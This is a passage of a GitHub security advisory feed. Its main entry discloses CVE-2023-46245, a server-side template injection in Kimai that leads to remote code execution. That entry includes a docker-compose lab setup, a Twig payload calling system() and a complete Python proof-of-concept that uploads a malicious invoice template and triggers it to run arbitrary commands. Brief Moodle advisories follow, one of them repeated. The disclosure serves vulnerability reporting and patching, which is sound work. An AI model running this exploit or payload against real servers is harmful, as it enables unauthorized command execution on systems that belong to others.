      start_period: 10s
      timeout: 10s
      retries: 3

  nginx:
    image: tobybatch/nginx-fpm-reverse-proxy
    ports:
      - 8001:80
    volumes:
      - public:/opt/kimai/public:ro
    restart: unless-stopped
    depends_on:
      - kimai
    healthcheck:
      test:  wget --spider http://nginx/health || exit 1
      interval: 20s
      start_period: 10s
      timeout: 10s
      retries: 3

  kimai: # This is the latest FPM image of kimai
    image: kimai/kimai2:fpm-prod
    environment:
      - ADMINMAIL=admin@kimai.local
      - ADMINPASS=changemeplease
      - DATABASE_URL=mysql://kimaiuser:kimaipassword@sqldb/kimai
      - TRUSTED_HOSTS=nginx,localhost,127.0.0.1,172.29.0.3,172.29.0.6,172.29.0.5.172.29.0.2
      - memory_limit=1024
    volumes:
      - public:/opt/kimai/public
      # - var:/opt/kimai/var
      # - ./ldap.conf:/etc/openldap/ldap.conf:z
      # - ./ROOT-CA.pem:/etc/ssl/certs/ROOT-CA.pem:z
    restart: unless-stopped

  phpmyadmin:
    image: phpmyadmin
    restart: always
    ports:
      - 8081:80
    environment:
      - PMA_ARBITRARY=1



  postfix:
    image: catatnight/postfix:latest
    environment:
      maildomain: neontribe.co.uk
      smtp_user: kimai:kimai
    restart: unless-stopped

volumes:
    var:
    public:
    mysql:
</code></pre>
<p>Steps to Reproduce (Manually):
1- Upload a malicious Twig file to the server containing the following payload <code>{{['id&gt;/tmp/pwned']|map('system')|join}}</code>
2- Trigger the SSTI vulnerability by downloading the invoices.
3- The malicious code gets executed, leading to RCE.
4- /tmp/pwned file will be created on the target system</p>
<p>I've also attached an automated script to ease up the process of reproducing:</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<pre><code class="language-python">import requests
import re
import string
import random
import sys

session = requests.session()
BASE_URL = sys.argv[1]


def generate(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def get_csrf(path, session):
    try:
        project_id = ""
        csrf_token = ""
        preview_id = ""
        template_ids = []
        activity_customer_list = []
        
        csrf_login_response = session.get(f"{BASE_URL}{path}").text
        
        # Extract CSRF Token
        pattern = re.compile(r'&lt;input[^&gt;]*?name=["\'].*?token[^"\']*["\'][^&gt;]*?value=["\'](.*?)["\'][^&gt;]*?&gt;', re.IGNORECASE)
        match = pattern.search(csrf_login_response)
        if match:
            csrf_token = match.group(1)
        
        if "performSearch" in path:
            preview_pattern = re.compile(r'&lt;div[^&gt;]*id="preview-token"[^&gt;]*data-value="(.*?)"[^&gt;]*&gt;', re.IGNORECASE)
            preview_match = preview_pattern.search(csrf_login_response)
            if preview_match:
                preview_id = preview_match.group(1)

        
        template_pattern = re.compile(r'&lt;option value="(\d+)" selected="selected"&gt;', re.IGNORECASE)
        template_matches = template_pattern.findall(csrf_login_response)
        if template_matches:
            template_ids = [int(id) for id in template_matches]
        
        if "timesheet" in path:
            option_pattern = re.compile(r'&lt;option value="(\d+)" data-customer="(\d+)" data-currency="EUR"&gt;', re.IGNORECASE)
            option_matches = option_pattern.findall(csrf_login_response)
            if option_matches:
                activity_customer_list = [(int(activity_id), int(customer_id)) for activity_id, customer_id in option_matches]
        
        if "project" in path or "activity" in path:
            project_id_match = re.search(r'&lt;option value="(\d+)"[^&gt;]*data-currency="EUR"[^&gt;]*&gt;', csrf_login_response)
            if project_id_match:
                project_id = project_id_match.group(1)
        
        return csrf_token, project_id, preview_id, template_ids, activity_customer_list
    
    except Exception as e:
        print(f"Error occurred: {e}")
        return None, None, None, None, None


def login(username,password,csrf,session):
    try:
        params = {"_username": username, "_password": password, "_csrf_token": csrf}
        login_response = session.post(f"{BASE_URL}/login_check", data=params, allow_redirects=True)
        if "I forgot my password" not in login_response.text:
            print(f"[+] Logged in: {username}")
            return session
        else:
            print("Wrong username,password", username)
            exit(1)
    except Exception as e:
        print(str(e))
        pass

def create_customer(token,name,session):
    try:

        data = {
            'customer_edit_form[name]': (None, name),
            'customer_edit_form[color]': (None, ''),
            'customer_edit_form[comment]': (None, 'xx'),
            'customer_edit_form[address]': (None, 'xx'),
            'customer_edit_form[company]': (None, ''),
            'customer_edit_form[number]': (None, '0002'),
            'customer_edit_form[vatId]': (None, ''),
            'customer_edit_form[country]': (None, 'DE'),
            'customer_edit_form[currency]': (None, 'EUR'),
            'customer_edit_form[timezone]': (None, 'UTC'),
            'customer_edit_form[contact]': (None, ''),
            'customer_edit_form[email]': (None, ''),
            'customer_edit_form[homepage]': (None, ''),
            'customer_edit_form[mobile]': (None, ''),
            'customer_edit_form[phone]': (None, ''),
            'customer_edit_form[fax]': (None, ''),
            'customer_edit_form[budget]': (None, '0.00'),
            'customer_edit_form[timeBudget]': (None, '0:00'),
            'customer_edit_form[budgetType]': (None, ''),
            'customer_edit_form[visible]': (None, '1'),
            'customer_edit_form[billable]': (None, '1'),
            'customer_edit_form[invoiceTemplate]': (None, ''),
            'customer_edit_form[invoiceText]': (None, ''),
            'customer_edit_form[_token]': (None, token),
        }


        response = session.post(f"{BASE_URL}/admin/customer/create", files=data)

    except Exception as e:
        print(str(e))


def create_project(token, name,project_id ,session):
    try:
        form_data = {
            'project_edit_form[name]': (None, name),
            'project_edit_form[color]': (None, ''),
            'project_edit_form[comment]': (None, ''),
            'project_edit_form[customer]': (None, project_id), 
            'project_edit_form[orderNumber]': (None, ''),
            'project_edit_form[orderDate]': (None, ''),
            'project_edit_form[start]': (None, ''),
            'project_edit_form[end]': (None, ''),
            'project_edit_form[budget]': (None, '0.00'),
            'project_edit_form[timeBudget]': (None, '0:00'),
            'project_edit_form[budgetType]': (None, ''),
            'project_edit_form[visible]': (None, '1'),
            'project_edit_form[billable]': (None, '1'),
            'project_edit_form[globalActivities]': (None, '1'),
            'project_edit_form[invoiceText]': (None, ''),
            'project_edit_form[_token]': (None, token)
        }
        
        response = session.post(f"{BASE_URL}/admin/project/create", files=form_data)
        
    except Exception as e:
        print(str(e))


def create_activity(token, name,project_id ,session):
    try:
        form_data = {
            'activity_edit_form[name]': (None, name),
            'activity_edit_form[color]': (None, ''),
            'activity_edit_form[comment]': (None, ''),
            'activity_edit_form[project]': (None, ''),
            'activity_edit_form[budget]': (None, '0.00'),
            'activity_edit_form[timeBudget]': (None, '0:00'),
            'activity_edit_form[budgetType]': (None, ''),
            'activity_edit_form[visible]': (None, '1'),
            'activity_edit_form[billable]': (None, '1'),
            'activity_edit_form[invoiceText]': (None, ''),
            'activity_edit_form[_token]': (None, token),
        }
        
        response = session.post(f"{BASE_URL}/admin/activity/create", files=form_data)
        
        if response.status_code == 201:
            print(f"[+] Activity created: {name}")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

def upload_malicious_document(token,session):
    try:
        form_data = {
            'invoice_document_upload_form[document]': ('din.pdf.twig', f"&lt;html&gt;&lt;body&gt;{{{{['{sys.argv[4]}']|map('system')|join}}}}&lt;/body&gt;&lt;/html&gt;", 'text/x-twig'),
            'invoice_document_upload_form[_token]': (None, token)
        }
        
        response = session.post(f"{BASE_URL}/invoice/document_upload", files=form_data)
        
        if ".pdf.twig" in response.text:
            print("[+] Twig uploaded successfully!")
        else:
            print("[-] Error while uploading, exiting..")
            exit(1)

    except Exception as e:
        print(f"An error occurred: {str(e)}")
import re

def create_malicious_template(token, name, session):
    try:
        data = {
            'invoice_template_form[name]': name,
            'invoice_template_form[title]': name,
            'invoice_template_form[company]': name,
            'invoice_template_form[vatId]': '',
            'invoice_template_form[address]': '',
            'invoice_template_form[contact]': '',
            'invoice_template_form[paymentTerms]': '',
            'invoice_template_form[paymentDetails]': '',
            'invoice_template_form[dueDays]': '30',
            'invoice_template_form[vat]': '0.000',
            'invoice_template_form[language]': 'en',
            'invoice_template_form[numberGenerator]': 'default',
            'invoice_template_form[renderer]': 'din',
            'invoice_template_form[calculator]': 'default',
            'invoice_template_form[_token]': token
        }
        
        response = session.post(f"{BASE_URL}/invoice/template/create", data=data)
        
        # Define the regex pattern to capture the template ID and match the name
        pattern = re.compile(fr'&lt;tr class="modal-ajax-form open-edit" data-href="/en/invoice/template/(\d+)/edit"&gt;\s*&lt;td class="alwaysVisible col_name"&gt;{re.escape(name)}&lt;/td&gt;', re.DOTALL)
        
        # Search the response text with the regex pattern
        match = pattern.search(response.text)
        
        if match:
            template_id = match.group(1)  # Extract the captured group
            print(f"[+] Malicious Template: {name}, Template ID: {template_id}")
            return template_id  # Return the captured template ID
        else:
            print("[-] Failed to capture the template ID")
            create_malicious_template(token,name,session)
        
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        exit(1)




def create_timesheet(token, activity, project, session):
    form_data = {
            'timesheet_edit_form[begin_date]': (None, '01/01/1980'),
            'timesheet_edit_form[begin_time]': (None, '12:00 AM'),
            'timesheet_edit_form[duration]': (None, '0:15'),
            'timesheet_edit_form[end_time]': (None, '12:15 AM'),
            'timesheet_edit_form[customer]': (None, ''),
            'timesheet_edit_form[project]': (None, project),
            'timesheet_edit_form[activity]': (None, activity),
            'timesheet_edit_form[description]': (None, ''),
            'timesheet_edit_form[fixedRate]': (None, ''),
            'timesheet_edit_form[hourlyRate]': (None, ''),
            'timesheet_edit_form[billableMode]': (None, 'auto'),
            'timesheet_edit_form[_token]': (None, token)
        }
    response = session.post(f"{BASE_URL}/timesheet/create", files=form_data,allow_redirects=False)
    if response.status_code == 302:  # Changed to 200 as 301 is for redirection
        print(f"[+] Created a new timesheet")


##############################





# login
csrf, _, _, _, _ = get_csrf("/login", session) 
# login("admin", "password", csrf, session)
login(sys.argv[2],sys.argv[3],csrf,session)
# create new customer

get_customer_token, _, _, _, _ = get_csrf("/admin/customer/create", session)  
customer_name = generate()
create_customer(get_customer_token, customer_name, session)
# create new project with customer_name

get_project_token, customer_id, _, _, _ = get_csrf("/admin/project/create", session)  
project_name = generate()
create_project(get_project_token, project_name, customer_id, session)

# create new activity 
get_activity_token, project_id, _, _, _ = get_csrf("/admin/activity/create", session)
activity_name = generate()
create_activity(get_activity_token, activity_name, project_id, session)

# EXPLOIT
######################

# upload malicious file
upload_token, _, _, _, _ = get_csrf("/invoice/document_upload", session)
upload_malicious_document(upload_token, session)

# create malicious template to trigger the SSTI
get_template_token, _, _, _, _ = get_csrf("/invoice/template/create", session)
template = generate()
temp_id = create_malicious_template(get_template_token, template, session)

# create a timesheet with project_id and activity_id
activity_customer_list = get_csrf("/timesheet/create", session)[4]  # get the activity_customer_list from get_csrf function

print(f"[+] Constructing renderer URLs..")
# iterate through all relative project_ids and customer_id for exploit stabiliy
for activity_id, customer_id in activity_customer_list:
    csrf = get_csrf("/timesheet/create", session)[0]  # Update CSRF token for each iteration
    print(f"[+] Creating timesheets with: Activity ID: {activity_id}, Customer ID: {customer_id}")
    create_timesheet(csrf, activity_id, customer_id, session)
    postData = {
        "searchTerm": "",
        "daterange": "",
        "state": "1",
        "billable": "0",
        "exported": "1",
        "orderBy": "begin",
        "order": "DESC",
        "exporter": "pdf"
    }
    # export timesheets so they appear in exported invoices
    export = session.post(f"{BASE_URL}/timesheet/export/", data=postData).text
    if "PDF-1.4" in export:
        csrf, _, _, _, _ = get_csrf("/invoice/", session)
        # get preview token to construct the preview URL to trigger SSTI
        csrf, project_id, preview_id, template_ids, activity_customer_list = get_csrf(f"/invoice/?searchTerm=&amp;daterange=&amp;exported=1&amp;invoiceDate=1%2F1%2F1980&amp;performSearch=performSearch&amp;_token={csrf}&amp;template={temp_id}", session)
        for template_id in template_ids:
            rendererURL = f"{BASE_URL}/invoice/preview/{customer_id}/{preview_id}?searchTerm=&amp;daterange=&amp;exported=1&amp;template={temp_id}&amp;invoiceDate=&amp;_token={csrf}&amp;customers[]={customer_id}"
            # trigger the payload by visiting the renderer URL 
            rce = session.get(rendererURL)
            
            if "PDF-1.4" in rce.text:
                print(rendererURL)
                print("[+] successfully executed payload")
                # save the pdf locally since rendered URL will expire as soon as we end the session
                pdf = f"{generate()}.pdf"
                with open(pdf,'wb') as pdfFile:
                    pdfFile.write(rce.content)
                    pdfFile.flush()
                    pdfFile.close()
                    print(f"[+] Saved results with name: {pdf}")
                exit(1)

print("[-] Failed to execute payload, try to trigger manually..")
</code></pre>
<p>which can be executed as such:</p>
<pre><code class="language-bash">$ python3 spl0it.py http://localhost:8001/en admin password "ls -la"
</code></pre>
<p>this will download the rendered file which will contain the results of the RCE:</p>
<p><img alt="kimaiRCE" src="https://user-images.githubusercontent.com/32583633/271780813-dd62020e-8ac8-4902-bc70-5503a9362e40.png"></p>
<h1 id="impact">Impact</h1>
<p>Remote Code Execution</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-fjhg-96cp-6fcw">https://github.com/kimai/kimai/security/advisories/GHSA-fjhg-96cp-6fcw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46245">https://nvd.nist.gov/vuln/detail/CVE-2023-46245</a></li>
<li><a href="https://github.com/kimai/kimai/commit/38e37f1c2e91e1acb221ec5c13f11b735bd50ae4">https://github.com/kimai/kimai/commit/38e37f1c2e91e1acb221ec5c13f11b735bd50ae4</a></li>
<li><a href="https://github.com/advisories/GHSA-fjhg-96cp-6fcw">https://github.com/advisories/GHSA-fjhg-96cp-6fcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjhg-96cp-6fcw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-30T15:40:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moodle/moodle] Moodle Exposes Sensitive User Information]]></title>
        <id>https://github.com/advisories/GHSA-mr97-gvvg-rhgh</id>
        <link href="https://github.com/advisories/GHSA-mr97-gvvg-rhgh"/>
        <updated>2024-01-12T16:20:32.000Z</updated>
        <content type="html"><![CDATA[<p>Moodle 2.1.x before 2.1.6 and 2.2.x before 2.2.3 allows remote authenticated users to obtain sensitive user information from hidden fields by leveraging the teacher role and navigating to "Enrolled users" under the Users Settings section.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2353">https://nvd.nist.gov/vuln/detail/CVE-2012-2353</a></li>
<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-31923">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-31923</a></li>
<li><a href="http://openwall.com/lists/oss-security/2012/05/23/2">http://openwall.com/lists/oss-security/2012/05/23/2</a></li>
<li><a href="https://github.com/moodle/moodle/commit/a645b79113b2ee7881b6bdae64a0c2a9f04db5c7">https://github.com/moodle/moodle/commit/a645b79113b2ee7881b6bdae64a0c2a9f04db5c7</a></li>
<li><a href="https://github.com/moodle/moodle/commit/ce13ea6ceb15f00c3cc6d40d79b06be39de7987a">https://github.com/moodle/moodle/commit/ce13ea6ceb15f00c3cc6d40d79b06be39de7987a</a></li>
<li><a href="https://github.com/moodle/moodle/commit/cfaa50a61d61719c65aa7e26f5444852931e07b6">https://github.com/moodle/moodle/commit/cfaa50a61d61719c65aa7e26f5444852931e07b6</a></li>
<li><a href="https://github.com/advisories/GHSA-mr97-gvvg-rhgh">https://github.com/advisories/GHSA-mr97-gvvg-rhgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mr97-gvvg-rhgh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:13:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moodle/moodle] Moodle Exposes Sensitive User Information]]></title>
        <id>https://github.com/advisories/GHSA-mr97-gvvg-rhgh</id>
        <link href="https://github.com/advisories/GHSA-mr97-gvvg-rhgh"/>
        <updated>2024-01-12T16:20:32.000Z</updated>
        <content type="html"><![CDATA[<p>Moodle 2.1.x before 2.1.6 and 2.2.x before 2.2.3 allows remote authenticated users to obtain sensitive user information from hidden fields by leveraging the teacher role and navigating to "Enrolled users" under the Users Settings section.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2353">https://nvd.nist.gov/vuln/detail/CVE-2012-2353</a></li>
<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-31923">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-31923</a></li>
<li><a href="http://openwall.com/lists/oss-security/2012/05/23/2">http://openwall.com/lists/oss-security/2012/05/23/2</a></li>
<li><a href="https://github.com/moodle/moodle/commit/a645b79113b2ee7881b6bdae64a0c2a9f04db5c7">https://github.com/moodle/moodle/commit/a645b79113b2ee7881b6bdae64a0c2a9f04db5c7</a></li>
<li><a href="https://github.com/moodle/moodle/commit/ce13ea6ceb15f00c3cc6d40d79b06be39de7987a">https://github.com/moodle/moodle/commit/ce13ea6ceb15f00c3cc6d40d79b06be39de7987a</a></li>
<li><a href="https://github.com/moodle/moodle/commit/cfaa50a61d61719c65aa7e26f5444852931e07b6">https://github.com/moodle/moodle/commit/cfaa50a61d61719c65aa7e26f5444852931e07b6</a></li>
<li><a href="https://github.com/advisories/GHSA-mr97-gvvg-rhgh">https://github.com/advisories/GHSA-mr97-gvvg-rhgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mr97-gvvg-rhgh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:13:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moodle/moodle] Moodle Authentication Bypass in Question-Bank]]></title>
        <id>https://github.com/advisories/GHSA-3rqj-jchw-9cc7</id>
        <link href="https://github.com/advisories/GHSA-3rqj-jchw-9cc7"/>
        <updated>2024-01-12T16:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>The question-bank functionality in Moodle 2.1.x before 2.1.6 and 2.2.x before 2.2.3 allows remote authenticated users to bypass intended capability requirements and save questions via a save_question action.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2356">https://nvd.nist.gov/vuln/detail/CVE-2012-2356</a></li>
<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-32239">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-32239</a></li>
<li><a href="http://openwall.com/lists/oss-security/2012/05/23/2">http://openwall.com/lists/oss-security/2012/05/23/2</a></li>
<li><a href="https://github.com/moodle/moodle/commit/0f83dd10a1d013e77906c7be4560126bb14c6b5c">https://github.com/moodle/moodle/commit/0f83dd10a1d013e77906c7be4560126bb14c6b5c</a></li>
<li><a href="https://github.com/moodle/moodle/commit/29e247e44e983f230f248192ffac8e7b7abe37fd">https://github.com/moodle/moodle/commit/29e247e44e983f230f248192ffac8e7b7abe37fd</a></li>
<li><a href="https://github.com/moodle/moodle/commit/51c5e6057c67687f5d872f8a228cfea275abf576">https://github.com/moodle/moodle/commit/51c5e6057c67687f5d872f8a228cfea275abf576</a></li>
<li><a href="https://github.com/advisories/GHSA-3rqj-jchw-9cc7">https://github.com/advisories/GHSA-3rqj-jchw-9cc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rqj-jchw-9cc7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:13:06.000Z</published>
    </entry>
</feed>